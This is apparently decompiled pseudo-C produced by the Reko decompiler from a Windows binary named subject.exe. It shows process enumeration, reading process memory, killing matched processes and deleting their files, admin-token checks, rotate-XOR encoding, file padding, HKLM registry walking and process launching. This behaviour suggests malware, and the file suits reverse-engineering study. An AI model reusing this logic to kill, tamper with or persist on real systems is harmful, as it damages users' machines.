// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 004013FA: Register word32 fn004013FA(Register word32 ebp, Register word32 esi, Stack word32 dwArg04, Stack word32 dwArg08, Register out ptr32 esiOut)
word32 fn004013FA(word32 ebp, word32 esi, word32 dwArg04, word32 dwArg08, ptr32 & esiOut)
{
	byte dl_13;
	fn00407460(0x0040E0C0, out dl_13);
	fn004052D3(0x00, 0x0040FDE0);
	uint32 eax_26 = fn00403464(0x0040FBA1, 0x00);
	Eq_15 eax_37 = GetModuleFileNameA(null, fp - 0x0448, 0x0104);
	word32 esp_46;
	word32 ebp_47;
	byte SCZO_48;
	word32 ebx_49;
	byte SZO_50;
	byte C_51;
	word32 eax_52;
	word32 ecx_53;
	byte Z_54;
	word32 esi_55;
	word32 edi_56;
	byte CZ_57;
	byte dl_58;
	byte bl_59;
	KERNEL32.dll!CreateToolhelp32Snapshot();
	struct Eq_58 * ebp_67;
	byte SCZO_68;
	word32 ebx_69;
	byte SZO_70;
	byte C_71;
	word32 eax_72;
	word32 ecx_73;
	byte Z_74;
	word32 esi_75;
	word32 edi_76;
	byte CZ_77;
	byte dl_78;
	byte bl_79;
	struct Eq_71 * esp_128;
	KERNEL32.dll!Module32First();
	if (eax_72 != 0x00)
	{
		*(esp_128 - 0x04) = fp - 0x0224;
		*(esp_128 - 0x08) = fp - 288;
		word32 edi_119;
		Eq_11 ecx_120 = fn00407370(dwArg00, out edi_119);
		*(esp_128 - 0x0C) = fp - 288;
		*(esp_128 - 0x10) = fp - 0x0448;
		if (fn0040C540(ecx_120, dwArg00, dwArg04) == 0x00)
			goto l004015EF;
		*(esp_128 - 0x04) = dwLoc033C;
		*(esp_128 - 0x08) = 0x00;
		*(esp_128 - 0x0C) = 0x001F0FFF;
		Eq_82 eax_140 = OpenProcess(*(esp_128 - 0x0C), *(esp_128 - 0x08), *(esp_128 - 0x04));
		if (eax_140 != null)
		{
			*(esp_128 - 0x04) = esi_75;
			*(esp_128 - 0x08) = edi_119;
			*(esp_128 - 0x0C) = 0x00080000;
			*(esp_128 - 0x10) = 0x00;
			*(esp_128 - 0x14) = 0x00411970;
			fn00407310(dwArg00, bArg04, dwArg08);
			uint32 eax_161 = dwLoc032C;
			if (dwLoc032C >= 0x00080000)
				eax_161 = 0x00080000;
			if (dwArg08 == 0x00)
			{
				*(esp_128 - 0x0C) = fp - 0x0C;
				*(esp_128 - 0x10) = eax_161;
				*(esp_128 - 0x14) = 0x00411970;
				*(esp_128 - 0x18) = dwLoc0330;
				*(esp_128 - 0x1C) = (HANDLE *) eax_140;
				if (ReadProcessMemory(*(esp_128 - 0x1C), *(esp_128 - 0x18), *(esp_128 - 0x14), *(esp_128 - 0x10), *(esp_128 - 0x0C)) == 0x00)
					goto l004015E1;
			}
			if (eax_26 <= 0x00)
				goto l004015E1;
l00401512:
			word32 eax_236;
			*(esp_128 - 0x0C) = ebp_67->dw0008;
			*(esp_128 - 0x10) = 0x0040FBA1;
			Eq_15 eax_224 = fn00403434(dwArg00, 0x00);
			*(esp_128 - 0x14) = (union Eq_15 *) eax_224;
			*(ebp_67 - 0x10) = (union Eq_15 *) eax_224;
			byte dl_228;
			Eq_15 eax_229 = fn00407460(dwArg00, out dl_228);
			uint32 esi_230 = 0x00411970;
			byte bl_235 = (byte) eax_229;
			if (ebp_67->dw000C != 0x00)
			{
				*(ebp_67 - 0x08) = (word32) eax_229 + 110;
				eax_236 = (word32) eax_229 + 110;
			}
			else
				eax_236 = *(ebp_67 - 0x08);
			if (eax_236 - eax_229 == 0x0A)
			{
l004015D2:
				ebp_67->dw0008 = ebp_67->dw0008 + 0x01;
				if (ebp_67->dw0008 < *(ebp_67 - 0x04))
					goto l00401512;
l004015E1:
				*(esp_128 - 0x0C) = *(ebp_67 - 0x0C);
				CloseHandle(*(esp_128 - 0x0C));
				*(esp_128 - 0x0C) = 0x01;
				*(esp_128 - 0x04) = *(ebp_67 - 0x0C);
				CloseHandle(*(esp_128 - 0x04));
				*(esp_128 - 0x04) = 0x01;
				word32 esi_203;
				*esiOut = esp_128->dw0004;
				esp_128 = &esp_128->dw0004 + 0x01;
				goto l004015EF;
			}
			else
			{
l0040154A:
				*(esp_128 - 0x0C) = *(ebp_67 - 0x14);
				word32 edi_262 = esi_230 + 0x00;
				*(esp_128 - 0x10) = edi_262;
				*(esp_128 - 0x14) = 0x0040E0C0;
				byte dl_267;
				byte bl_268;
				if (fn0040C490(dl_228, bl_235, dwArg00, 0x00, dwArg08, out dl_267, out bl_268) != 0x00)
				{
					if (ebp_67->dw000C == 0x00)
					{
						*(esp_128 - 0x0C) = (union Eq_15 *) eax_229;
						*(esp_128 - 0x10) = edi_262;
						*(esp_128 - 0x14) = *(ebp_67 - 0x10);
						if (fn0040C490(dl_267, bl_268, dwArg00, 0x00, dwArg08, out dl_228, out bl_235) != 0x00)
						{
							esi_230 = esi_230 + 0x01;
							if (esi_230 < (*(ebp_67 - 0x08) - eax_229) - 0x0A)
								goto l0040154A;
							goto l004015D2;
						}
					}
					*(esp_128 - 0x0C) = 0x00;
					*(esp_128 - 0x10) = *(ebp_67 - 0x0C);
					TerminateProcess(*(esp_128 - 0x10), *(esp_128 - 0x0C));
					*(esp_128 - 0x0C) = 0x32;
					Sleep(*(esp_128 - 0x0C));
					*(esp_128 - 0x0C) = 0x01;
					*(esp_128 - 0x10) = 0x0040FDCC;
					*(esp_128 - 0x14) = (union Eq_15 *) fn00403434(dwArg00, 0x00);
					*(esp_128 - 0x18) = ebp_67 - 0x011C;
					if (fn00403B7D(ebp_67, dwArg00, 0x00) == 0x00)
					{
						*(esp_128 - 0x0C) = ebp_67 - 0x011C;
						fn00403DFA(dwArg00);
					}
				}
				ebp_67->dw0008 = *(ebp_67 - 0x04) + 0x01;
				break;
			}
		}
	}
l004015EF:
	struct Eq_75 * esp_101 = esp_128 - 0x04;
	esp_101->t0000 = (Eq_82) *(ebp_67 - 0x18);
	CloseHandle(esp_101->t0000);
	return esp_101->dw0004;
}

// 0040174B: void fn0040174B()
void fn0040174B()
{
	return;
}

// 0040174E: Register Eq_261 fn0040174E(Register (ptr Eq_603) ecx, Stack Eq_11 dwArg04, Stack ptr32 dwArg08, Stack word32 dwArg0C, Register out ptr32 ecxOut)
Eq_261 fn0040174E(Eq_603 * ecx, Eq_11 dwArg04, ptr32 dwArg08, word32 dwArg0C, ptr32 & ecxOut)
{
	ecx->t0000 = null;
	ecx->t0004 = null;
	&ecx->t0008.u0->dw0000 = 0x00;
	word32 ecx_31;
	*ecxOut = 0x04;
	Eq_15 eax_182 = 0x80000000;
	Eq_15 ebx_183 = 0x02;
	Eq_15 dwLoc0C_184 = 0x04;
	if (dwArg0C == 0x00)
	{
		eax_182.u0 = 0xC0000000;
		ebx_183.u0 = 0x04;
		dwLoc0C_184.u0 = 0x02;
	}
	Eq_261 eax_129;
	if (dwArg04 != 0x00)
	{
		Eq_82 eax_162 = CreateFileA(dwArg04, eax_182, 0x01, null, 0x03, 0x20, null);
		ecx->t0000 = eax_162;
		if (eax_162 == (void *) ~0x00)
			goto l004017FF;
		Eq_15 eax_172 = GetFileSize(eax_162, fp - 0x08);
		ecx->t000C = eax_172;
		word32 ecx_167;
		*ecxOut = fp - 0x08;
		if (false)
		{
l004017D2:
			CloseHandle(ecx->t0000);
			goto l004017FF;
		}
		word32 ecx_178;
		*ecxOut = dwArg08;
		if (dwArg08 != null)
			*dwArg08 = (union Eq_15 *) eax_172;
	}
	Eq_82 eax_113 = CreateFileMappingA(ecx->t0000, null, ebx_183, 0x00, 0x00, 0x00);
	ecx->t0004 = eax_113;
	if (eax_113 != null)
	{
		eax_129 = MapViewOfFile(eax_113, dwLoc0C_184, 0x00, 0x00, 0x00);
		ecx->t0008 = eax_129;
		if (eax_129 != 0x00)
			return eax_129;
		CloseHandle(ecx->t0004);
		CloseHandle(ecx->t0000);
l004017FF:
		&eax_129.u0->dw0000 = 0x00;
		return eax_129;
	}
	goto l004017D2;
}

// 00401808: Register word32 fn00401808(Register (ptr Eq_739) ecx, Register out ptr32 ediOut)
word32 fn00401808(Eq_739 * ecx, ptr32 & ediOut)
{
	struct Eq_739 * esi_33 = ecx;
	Eq_11 eax_11 = ecx->t0008;
	if (eax_11 != 0x00)
		UnmapViewOfFile(eax_11);
	Eq_82 eax_18 = ecx->t0004;
	if (eax_18 != null)
		CloseHandle(eax_18);
	struct Eq_758 * esp_24 = fp - 0x08;
	if (ecx->dw0000 != 0x00)
		CloseHandle(*esp_50);
	esi_33->dw0000 = esi_33->dw0000 & 0x00;
	esi_33->t0004 = esi_33->t0004 & 0x00;
	esi_33->t0008 = esi_33->t0008 & 0x00;
	word32 edi_45;
	*ediOut = esp_24->dw0000;
	return esp_24->dw0004;
}

// 00402642: Register word32 fn00402642(Stack word32 dwArg04, Register out ptr32 esiOut, Register out ptr32 ediOut)
word32 fn00402642(word32 dwArg04, ptr32 & esiOut, ptr32 & ediOut)
{
	word32 * esp_205;
	Eq_15 eax_16 = GetCurrentProcessId();
	*dwArg04 = 0x00;
	Eq_82 eax_41 = OpenProcess(0x001F0FFF, 0x00, eax_16);
	Eq_261 dwLoc0C_180 = 0x00;
	word32 dwLoc20_352 = 0x00;
	if (OpenProcessToken(eax_41, 0x08, fp - 0x14) == 0x00)
	{
l004026A5:
		GetLastError();
		esp_205 = fp - 0x40;
		goto l004026AB;
	}
	Eq_261 eax_231 = LocalAlloc(0x00, 0x32);
	dwLoc0C_180 = eax_231;
	if (eax_231 == 0x00)
		goto l004026A5;
	if (GetTokenInformation(null, 0x02, eax_231, 0x32, fp - 0x10) != 0x00)
	{
l00402719:
		if (AllocateAndInitializeSid(fp - 44, 0x01, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, fp - 0x1C) != 0x00 && AllocateAndInitializeSid(fp - 44, 0x01, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, fp - 0x18) != 0x00)
		{
			uint32 dwArg04_345 = 0x00;
			if (*dwLoc0C_180 > 0x00)
			{
				word32 esi_365 = dwLoc0C_180 + 0x04;
				do
				{
					Eq_960 eax_373 = *esi_365;
					if (EqualSid(eax_373, null) != 0x00)
					{
						*dwArg04 = 0x00;
						dwLoc20_352 = 0x01;
						break;
					}
					if (EqualSid(eax_373, null) != 0x00)
					{
						*dwArg04 = 0x01;
						dwLoc20_352 = 0x00;
						break;
					}
					uint32 v26_395 = dwArg04_345 + 0x01;
					dwArg04_345 = v26_395;
					esi_365 = esi_365 + 0x08;
				} while (v26_395 < *dwLoc0C_180);
			}
			esp_205 = fp - 0x40;
			if (*dwArg04 == 0x00 && dwLoc20_352 == 0x00)
				*dwArg04 = 0x01;
l004027C5:
			if (0x00 != 0x00)
			{
				PSID * esp_176 = esp_205 - 0x04;
				*esp_176 = (PSID *) null;
				FreeSid(*esp_176);
			}
			word32 * esp_102 = esp_205;
			if (0x00 != 0x00)
			{
				PSID * esp_160 = esp_205 - 0x04;
				*esp_160 = (PSID *) null;
				FreeSid(*esp_160);
			}
			if (dwLoc0C_180 != 0x00)
			{
				union Eq_261 * esp_155 = esp_102 - 0x04;
				*esp_155 = (union Eq_261 *) dwLoc0C_180;
				LocalFree(*esp_155);
			}
			if (0x00 != 0x00)
			{
				HANDLE * esp_150 = esp_102 - 0x04;
				*esp_150 = (HANDLE *) null;
				CloseHandle(*esp_150);
			}
			word32 * esp_111 = esp_102;
			if (eax_41 != null)
			{
				HANDLE * esp_134 = esp_102 - 0x04;
				*esp_134 = (HANDLE *) eax_41;
				CloseHandle(*esp_134);
			}
			struct Eq_1065 * esp_123 = esp_111 + 0x01;
			word32 edi_122;
			*ediOut = *esp_111;
			word32 esi_124;
			*esiOut = esp_123->dw0000;
			return esp_123->dw0004;
		}
		goto l00402753;
	}
	else
	{
		if (GetLastError() == 122)
		{
			LocalFree(eax_231);
			Eq_261 eax_419 = LocalAlloc(0x00, 0x32);
			dwLoc0C_180 = eax_419;
			if (eax_419 != 0x00 && GetTokenInformation(null, 0x02, eax_419, 0x32, fp - 0x10) != 0x00)
				goto l00402719;
		}
l00402753:
		GetLastError();
l004026AB:
		goto l004027C5;
	}
}

// 00403434: Register Eq_11 fn00403434(Stack Eq_11 dwArg04, Stack Eq_11 dwArg08)
Eq_11 fn00403434(Eq_11 dwArg04, Eq_11 dwArg08)
{
	Eq_11 esi_28 = dwArg04;
	int32 edi_10 = 0x00;
	if (dwArg08 > 0x00)
	{
		do
		{
			byte dl_40;
			if (fn00407460(esi_28, out dl_40) == 0x00)
				return esi_28;
			edi_10 = edi_10 + 0x01;
			byte dl_49;
			esi_28 = (word32) fn00407460(esi_28, out dl_49) + ((word32) esi_28 + 0x01);
		} while (edi_10 < dwArg08);
	}
	return esi_28;
}

// 00403464: Register word32 fn00403464(Stack word32 dwArg04, Stack word32 dwArg08)
word32 fn00403464(word32 dwArg04, word32 dwArg08)
{
	Eq_11 esi_17 = dwArg04;
	word32 edi_10 = 0x00;
	while (true)
	{
		byte dl_21;
		Eq_15 eax_22 = fn00407460(esi_17, out dl_21);
		if (eax_22 == 0x00 || dwArg08 != 0x00 && esi_17 - dwArg04 >= dwArg08)
			break;
		esi_17 = (word32) eax_22 + ((word32) esi_17 + 0x01);
		edi_10 = edi_10 + 0x01;
	}
	return edi_10;
}

// 00403496: Register word32 fn00403496(Register word32 esi, Register out ptr32 ediOut)
word32 fn00403496(word32 esi, ptr32 & ediOut)
{
	struct Eq_1140 * esp_14 = fp - 0x08;
	int32 edi_13 = 0x00;
	do
	{
		struct Eq_1140 * esp_16 = esp_14 - 0x04;
		esp_16->dw0000 = 0x00;
		byte dl_33 = (byte) (uint32) ((uint64) (uint32) fn00404687(dwArg00) % ((0x00 - (-edi_13 == 0x00) & 0xF8) + 0x08));
		byte * eax_36 = esp_16->dw000C + edi_13;
		*eax_36 = dl_33;
		esp_14 = esp_16;
		if (dl_33 == 0x00)
			*eax_36 = 0x01;
		edi_13 = edi_13 + 0x01;
	} while (edi_13 < 0x04);
	word32 edi_45;
	*ediOut = esp_16->dw0000;
	return esp_16->dw0004;
}

// 004034CD: void fn004034CD(Stack word32 dwArg04, Stack Eq_11 dwArg08, Stack Eq_11 dwArg0C, Stack byte bArg0F)
void fn004034CD(word32 dwArg04, Eq_11 dwArg08, Eq_11 dwArg0C, byte bArg0F)
{
	int32 dwLoc0C_11 = dwLoc0C & 0x00;
	byte cl_20 = dwArg0C->b0000;
	byte al_21 = dwArg0C->b0001;
	if (dwArg08 > 0x00)
	{
		do
		{
			ui8 * eax_78 = dwArg04 + dwLoc0C_11;
			*eax_78 = __rol(*eax_78, cl_20) ^ al_21;
			int32 v18_123 = dwLoc0C_11 + 0x01;
			dwLoc0C_11 = v18_123;
		} while (v18_123 < dwArg08);
	}
	return;
}

// 00403529: void fn00403529(Stack Eq_11 dwArg04, Stack word32 dwArg08, Stack word32 dwArg0C, Stack byte bArg0F)
void fn00403529(Eq_11 dwArg04, word32 dwArg08, word32 dwArg0C, byte bArg0F)
{
	int32 dwLoc0C_11 = dwLoc0C & 0x00;
	byte cl_20 = dwArg0C->b0000;
	byte al_21 = dwArg0C->b0001;
	if (dwArg08 > 0x00)
	{
		do
		{
			byte * eax_78 = dwArg04 + dwLoc0C_11;
			*eax_78 = __ror(*eax_78 ^ al_21, cl_20);
			int32 v18_123 = dwLoc0C_11 + 0x01;
			dwLoc0C_11 = v18_123;
		} while (v18_123 < dwArg08);
	}
	return;
}

// 00403585: Register byte fn00403585(Register int32 ebx, Stack ui32 dwArg00, Register out ptr32 ebxOut, Register out ptr32 esiOut, Register out ptr32 ediOut)
byte fn00403585(int32 ebx, ui32 dwArg00, ptr32 & ebxOut, ptr32 & esiOut, ptr32 & ediOut)
{
	byte al_47;
	byte bl_27 = (byte) dwArg00;
	word32 * esp_105 = fp - 0x10;
	word32 esi_104 = (uint32) ((uint64) (uint32) fn00404687(0x00) % 0x1A) + 0x61;
	if (dwArg00 != 0x04)
	{
		if (dwArg00 == 0x01)
		{
			esp_105 = fp - 0x14;
			al_47 = (byte) ((uint32) ((uint64) (uint32) fn00404687(0x00) % 0x0A) + 0x30);
l00403620:
			struct Eq_1318 * esp_52 = esp_105 + 0x01;
			word32 edi_51;
			*ediOut = *esp_105;
			word32 esi_53;
			*esiOut = esp_52->dw0000;
			word32 ebx_55;
			*ebxOut = esp_52->dw0004;
			return al_47;
		}
		if ((bl_27 & 0x02) != 0x00)
		{
			esp_105 = fp - 0x14;
			esi_104 = (uint32) ((uint64) (uint32) fn00404687(0x00) % 0x1A) + 0x41;
		}
		word32 * esp_106 = esp_105 - 0x04;
		*esp_106 = 0x00;
		word32 * esp_115 = esp_106;
		if (((byte) fn00404687(dwArg00) & 0x01) != 0x00 && (bl_27 & 0x04) != 0x00)
		{
			*(esp_106 - 0x04) = 0x00;
			uint64 edx_eax_162 = (uint64) (uint32) fn00404687(dwArg00);
			*(esp_106 - 0x08) = 0x1A;
			esp_115 = esp_106 - 0x04;
			esi_104 = (uint32) (edx_eax_162 % *(esp_106 - 0x08)) + 0x61;
		}
		word32 * esp_121 = esp_115 - 0x04;
		*esp_121 = 0x00;
		esp_105 = esp_121;
		if (((byte) fn00404687(dwArg00) & 0x01) != 0x00 && (bl_27 & 0x01) != 0x00)
		{
			*(esp_121 - 0x04) = 0x00;
			uint64 edx_eax_141 = (uint64) (uint32) fn00404687(dwArg00);
			*(esp_121 - 0x08) = 0x0A;
			esp_105 = esp_121 - 0x04;
			esi_104 = (uint32) (edx_eax_141 % *(esp_121 - 0x08)) + 0x30;
		}
	}
	al_47 = (byte) esi_104;
	goto l00403620;
}

// 00403624: void fn00403624(Register ui32 ebx, Stack word32 dwArg08, Stack word32 dwArg0C)
void fn00403624(ui32 ebx, word32 dwArg08, word32 dwArg0C)
{
	struct Eq_1442 * esp_10 = fp - 0x0C;
	int32 esi_15 = dwArg08;
	if (dwArg0C > dwArg08)
	{
		esp_10 = fp - 0x10;
		esi_15 = (word32) (uint32) ((uint64) (uint32) fn00404687(0x00) % (dwArg0C - dwArg08)) + dwArg08;
	}
	int32 ebx_32 = esp_10->dw0010;
	if (esi_15 > 0x00)
	{
		do
		{
			*(esp_10 - 0x04) = esp_10->dw001C;
			Eq_1505 esi_70;
			Eq_1506 edi_71;
			byte al_72 = fn00403585(ebx_32, ebx, out ebx_32, out esi_70, out edi_71);
			*((word32) edi_71 + ebx_32) = al_72;
		} while ((word32) edi_71 + 0x01 < esi_70);
	}
	word32 * esp_41 = esp_10 - 0x04;
	*esp_41 = 0x02;
	byte * ebx_43;
	word32 esi_44;
	int32 edi_45;
	byte al_46 = fn00403585(ebx_32, ebx, out ebx_43, out esi_44, out edi_45);
	*ebx_43 = al_46;
	ebx_43[edi_45] = ebx_43[edi_45] & 0x00;
	*esp_41 = 0x01;
	return;
}

// 00403B7D: Register word32 fn00403B7D(Register (ptr Eq_58) ebp, Stack Eq_11 dwArg04, Stack word32 dwArg08)
word32 fn00403B7D(Eq_58 * ebp, Eq_11 dwArg04, word32 dwArg08)
{
	fn00407B80(0x2000, dwLoc08);
	*(fp - 0x08) = dwArg04;
	*(fp - 0x0C) = fp + ~0x2003;
	word32 edi_16;
	fn00407370(dwArg00, out edi_16);
	*(fp - 0x10) = dwArg08;
	*(fp - 0x14) = fp + ~0x1003;
	word32 edi_25;
	fn00407370(dwArg00, out edi_25);
	*(fp - 0x18) = fp + ~0x2003;
	fn0040C5CC(fp - 0x04, dwArg00);
	*(fp - 0x1C) = fp + ~0x1003;
	fn0040C5CC(fp - 0x04, dwArg00);
	*(fp - 0x20) = fp + ~0x1003;
	*(fp - 0x24) = fp + ~0x2003;
	return fn00407FC0(dwArg00, dwArg04);
}

// 00403BD8: void fn00403BD8(Register word32 esi, Stack ptr32 dwArg04)
void fn00403BD8(word32 esi, ptr32 dwArg04)
{
	word32 edi_12;
	fn00407370(dwArg04, out edi_12);
	*(fp - 0x10) = fp->dw0008;
	*(fp - 0x14) = 0x0040F244;
	*(fp - 0x18) = (union Eq_15 *) fn00403434(dwArg00, dwArg04);
	*(fp - 0x1C) = fp->dw0004;
	fn00407380(dwArg00);
	return;
}

// 00403CBB: void fn00403CBB(Stack Eq_11 dwArg04, Stack Eq_11 dwArg08, Stack word32 dwArg0C)
void fn00403CBB(Eq_11 dwArg04, Eq_11 dwArg08, word32 dwArg0C)
{
	Eq_82 eax_29 = CreateFileA(dwArg04, 0xC0000000, 0x03, null, 0x02, 0x20, null);
	if (eax_29 != (void *) ~0x00 && dwArg08 != 0x00)
	{
		WriteFile(eax_29, dwArg08, dwArg0C, fp + 0x04, null);
		CloseHandle(eax_29);
	}
	return;
}

// 00403D58: Register word32 fn00403D58(Stack Eq_11 dwArg04, Register out Eq_1682 esiOut)
word32 fn00403D58(Eq_11 dwArg04, Eq_1682 & esiOut)
{
	*esiOut = esi;
	fn0040174B();
	word32 ecx_19;
	if (fn0040174E(fp - 0x18, dwArg04, fp - 0x08, 0x01, out ecx_19) == null)
		return 0x00;
	else
	{
		word32 edi_35;
		word32 esi_36;
		*esiOut = fn00401808(fp - 0x18, out edi_35);
		*(fp - 0x1C) = 0x01;
		return *(fp - 0x1C);
	}
}

// 00403DFA: void fn00403DFA(Stack Eq_11 dwArg04)
void fn00403DFA(Eq_11 dwArg04)
{
	SetFileAttributesA(dwArg04, 0x20);
	DeleteFileA(dwArg04);
	return;
}

// 00403F63: void fn00403F63(Stack Eq_11 dwArg04, Stack Eq_11 dwArg08)
void fn00403F63(Eq_11 dwArg04, Eq_11 dwArg08)
{
	if (dwArg08 >= 0x00013000)
	{
		SetFileAttributesA(dwArg04, 0x20);
		Eq_82 eax_100 = CreateFileA(dwArg04, 0xC0000000, 0x03, null, 0x03, 0x20, null);
		Eq_82 edi_102 = eax_100;
		if (eax_100 != (void *) ~0x00)
		{
			ptr32 esp_135;
			Eq_15 eax_110 = GetFileSize(eax_100, fp - 0x08);
			if (eax_110 > dwArg08)
			{
				SetFilePointer(eax_100, dwArg08, null, 0x00);
				SetEndOfFile(eax_100);
				esp_135 = fp - 0x14;
			}
			else
			{
				SetFilePointer(eax_100, 0x00, null, 0x02);
				int32 eax_178 = (int32) ((int64) (dwArg08 - eax_110) / 0x00080000);
				if (eax_178 > 0x00)
				{
					int32 dwArg08_215 = eax_178;
					do
					{
						WriteFile(eax_100, 0x00411970, 0x00080000, fp - 0x08, null);
						int32 v20_230 = dwArg08_215 - 0x01;
						dwArg08_215 = v20_230;
					} while (v20_230 != 0x00);
				}
				WriteFile(esp_199->t0000, esp_199->t0004, esp_199->t0008, esp_199->t000C, esp_199->t0010);
			}
			HANDLE * esp_136 = esp_135 - 0x04;
			*esp_136 = (HANDLE *) edi_102;
			CloseHandle(*esp_136);
			*esp_136 = (HANDLE *) (void *) 0x01;
			return;
		}
	}
	return;
}

// 0040451C: void fn0040451C(Stack Eq_11 dwArg04, Stack Eq_11 dwArg08, Stack word32 dwArg0C, Stack word32 dwArg10)
void fn0040451C(Eq_11 dwArg04, Eq_11 dwArg08, word32 dwArg0C, word32 dwArg10)
{
	if (RegCreateKeyA(dwArg04, dwArg08, fp + 0x08) == null)
	{
		byte dl_50;
		RegSetValueExA(dwArg08, dwArg0C, 0x00, 0x01, dwArg10, fn00407460(dwArg10, out dl_50));
		RegCloseKey(dwArg08);
		return;
	}
	else
		return;
}

// 00404562: void fn00404562(Stack word32 dwArg04, Stack Eq_15 dwArg08, Stack word32 dwArg0C, Stack ptr32 dwArg10)
void fn00404562(word32 dwArg04, Eq_15 dwArg08, word32 dwArg0C, ptr32 dwArg10)
{
	word32 esi_116 = 0x00;
	ptr32 esp_120 = fp - 0x0114;
	if (RegOpenKeyA(dwArg04, dwArg08, fp - 0x08) == null)
	{
		while (true)
		{
			union Eq_15 * esp_50 = esp_120 - 0x04;
			*esp_50 = 0x0104;
			*(esp_50 - 0x04) = fp - 0x0110;
			*(esp_50 - 0x08) = esi_116;
			*(esp_50 - 0x0C) = (union Eq_15 *) dwLoc08;
			Eq_1850 eax_60 = RegEnumKeyA(*(esp_50 - 0x0C), *(esp_50 - 0x08), *(esp_50 - 0x04), *esp_50);
			esp_120 = (char *) esp_50 + 0x04;
			if (eax_60 != null)
				break;
			if (dwArg0C != eax_60)
			{
				ui32 v13_92 = dwLoc0C & eax_60;
				*esp_50 = (union Eq_15 *) dwArg10;
				*(esp_50 - 0x04) = fp - 0x0C;
				*(esp_50 - 0x08) = fp - 0x0110;
				*(esp_50 - 0x0C) = (union Eq_15 *) dwArg08;
				*(esp_50 - 0x10) = (union Eq_15 *) dwArg04;
				dwLoc0C = v13_92;
				word32 esp_112;
				word32 ebp_113;
				byte SCZO_114;
				word32 eax_115;
				byte SZO_117;
				byte C_118;
				byte Z_119;
				dwArg0C();
				esp_120 = esp_112 + 0x14;
				if (v13_92 != 0x00)
					goto l004045D2;
			}
			esi_116 = esi_116 + 0x01;
		}
		*esp_50 = 0x01;
		esp_120 = (char *) esp_50 + 0x04;
l004045D2:
		union Eq_15 * esp_74 = esp_120 - 0x04;
		*esp_74 = (union Eq_15 *) dwLoc08;
		RegCloseKey(*esp_74);
	}
	return;
}

// 004045E0: void fn004045E0(Stack Eq_11 dwArg04, Stack word32 dwArg08, Stack word32 dwArg0C, Stack word32 dwArg10)
void fn004045E0(Eq_11 dwArg04, word32 dwArg08, word32 dwArg0C, word32 dwArg10)
{
	word32 ebx_114 = 0x00;
	ptr32 esp_116 = fp - 0x0820;
	if (RegOpenKeyA(dwArg04, dwArg08, fp - 0x08) == null)
	{
		while (true)
		{
			LPDWORD * esp_62 = esp_116 - 0x04;
			*esp_62 = (LPDWORD *) (fp - 0x0C);
			*(esp_62 - 0x04) = fp + ~0x0817;
			*(esp_62 - 0x08) = fp - 0x18;
			*(esp_62 - 0x0C) = 0x00;
			*(esp_62 - 0x10) = fp - 0x14;
			*(esp_62 - 0x14) = fp - 0x0418;
			*(esp_62 - 0x18) = ebx_114;
			*(esp_62 - 0x1C) = (union Eq_15 *) dwLoc08;
			Eq_1850 eax_85 = RegEnumValueA(*(esp_62 - 0x1C), *(esp_62 - 0x18), *(esp_62 - 0x14), *(esp_62 - 0x10), *(esp_62 - 0x0C), *(esp_62 - 0x08), *(esp_62 - 0x04), *esp_62);
			esp_116 = (char *) esp_62 + 0x04;
			if (eax_85 != null)
				break;
			if (dwLoc18 == 0x01 && dwArg0C != eax_85)
			{
				ui32 v14_122 = dwLoc10 & eax_85;
				*esp_62 = (LPDWORD *) dwArg10;
				*(esp_62 - 0x04) = fp - 0x10;
				*(esp_62 - 0x08) = fp - 0x0418;
				*(esp_62 - 0x0C) = (union Eq_15 *) dwArg08;
				*(esp_62 - 0x10) = (union Eq_15 *) dwArg04;
				dwLoc10 = v14_122;
				word32 esp_142;
				word32 ebp_143;
				byte SCZO_144;
				word32 eax_146;
				word32 esi_147;
				byte SZO_148;
				byte C_149;
				byte Z_150;
				dwArg0C();
				esp_116 = esp_142 + 0x14;
				if (v14_122 != 0x00)
					goto l00404678;
			}
			ebx_114 = ebx_114 + 0x01;
		}
		*esp_62 = (LPDWORD *) (DWORD *) 0x01;
		esp_116 = (char *) esp_62 + 0x04;
l00404678:
		union Eq_15 * esp_100 = esp_116 - 0x04;
		*esp_100 = (union Eq_15 *) dwLoc08;
		RegCloseKey(*esp_100);
	}
	return;
}

// 00404687: Register word32 fn00404687(Stack Eq_11 dwArg04)
word32 fn00404687(Eq_11 dwArg04)
{
	if (dwArg04 != 0x00 || globals->dw41196C == 0x00)
	{
		fn00407B55(GetTickCount());
		globals->dw41196C = fn00407B5F();
	}
	return fn00407B5F();
}

// 004046B3: Register ui32 fn004046B3(Stack Eq_11 dwArg04, Stack Eq_11 dwArg08)
ui32 fn004046B3(Eq_11 dwArg04, Eq_11 dwArg08)
{
	fn00407310(fp - 88, 0x00, 0x44);
	return 0x00 - (-CreateProcessA(dwArg04, dwArg08, null, null, 0x00, 0x00, 0x00, 0x00, fp - 88, fp - 0x14) == 0x00) & dwLoc14;
}

// 004048CB: Register ui32 fn004048CB(Register ui32 ebx, Register ptr32 ebp, Register word32 esi, Register out ptr32 ediOut)
ui32 fn004048CB(ui32 ebx, ptr32 ebp, word32 esi, ptr32 & ediOut)
{
	*ediOut = edi;
	if (globals->t491E88 == 0x00)
		fn00404562(0x80000002, fn00403434(0x0040F244, 0x04), 0x004047FD, fp - 0x08);
	else
	{
		fn00403BD8(esi, fp - 0x041C);
		*(fp - 0x052C) = fp - 0x041C;
		*(fp - 0x0530) = 4790904;
		word32 edi_182;
		fn00407370(dwArg00, out edi_182);
		*(fp - 1332) = fp - 0x08;
		*(fp - 1336) = 0x00404769;
		*(fp - 0x053C) = fp - 0x041C;
		*(fp - 0x0540) = 0x80000002;
		fn004045E0(dwArg00, dwArg04, dwArg08, dwArg0C);
	}
	globals->dw491E8C = dwLoc08 & 0x00;
	if ((dwLoc08 & 0x00) == 0x00)
	{
		*(fp - 1316) = esi;
		*(fp - 0x0528) = 0x0104;
		*(fp - 0x052C) = fp - 0x0520;
		GetSystemDirectoryA(*(fp - 0x052C), *(fp - 0x0528));
		do
		{
			*(fp - 0x1C) = *(fp - 0x1C) & 0x00;
			*(fp - 0x0528) = 0x0040F769;
			*(fp - 0x052C) = fp - 0x1C;
			word32 edi_75;
			fn00407370(dwArg00, out edi_75);
			*(fp - 0x0528) = 0x04;
			*(fp - 0x052C) = 0x04;
			*(fp - 0x0530) = 0x02;
			*(fp - 1332) = fp - 0x1C;
			byte dl_90;
			*(fp - 1332) = (word32) fn00407460(dwArg00, out dl_90) + (fp - 0x1C);
			fn00403624(ebx, dwArg04, dwArg08);
